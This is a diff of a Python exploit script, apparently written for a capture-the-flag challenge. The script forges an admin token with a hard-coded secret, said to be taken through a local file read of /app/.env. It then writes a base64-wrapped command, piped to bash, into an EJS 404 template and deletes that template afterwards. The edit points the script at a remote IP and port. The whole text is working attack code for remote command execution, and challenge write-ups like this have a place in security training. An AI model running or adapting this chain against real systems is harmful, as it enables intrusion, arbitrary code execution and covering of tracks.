@@ -5,8 +5,8 @@ from urllib.parse import quote
 
 # Key obtained from LFR within /app/.env
 secret = "Str0ng_K3y_N0_l3ak_pl3ase?"
-host = "127.0.0.1"
-port = 1337
+host = "94.237.50.221"
+port = 31452
 
 def generateToken(key):
     payload = { "role": "admin" }
@@ -17,14 +17,16 @@ def generateToken(key):
 def writeFile(token, command):
     template_file = "/app/views/errors/404.ejs"
 
-    # base64 encoding to avoid url format issue within graphql
-    # deleting file after execution since mysql can only write into non-existing filename
-    command = f"echo {quote(b64encode(command.encode()).decode())} | base64 -d | bash; rm {template_file}"
     print(f"Command: {command}")
     print( command.encode())
     print(f"Encoded Command: {b64encode(command.encode())}")
     print(f"Encoded Command: {b64encode(command.encode()).decode()}")
     print(f"Encoded Command: {quote(b64encode(command.encode()).decode())}")
+
+    # base64 encoding to avoid url format issue within graphql
+    # deleting file after execution since mysql can only write into non-existing filename
+    command = f"echo {quote(b64encode(command.encode()).decode())} | base64 -d | bash; rm {template_file}"
+
 
     url = f"http://{host}:{port}/download?token={token}"
 
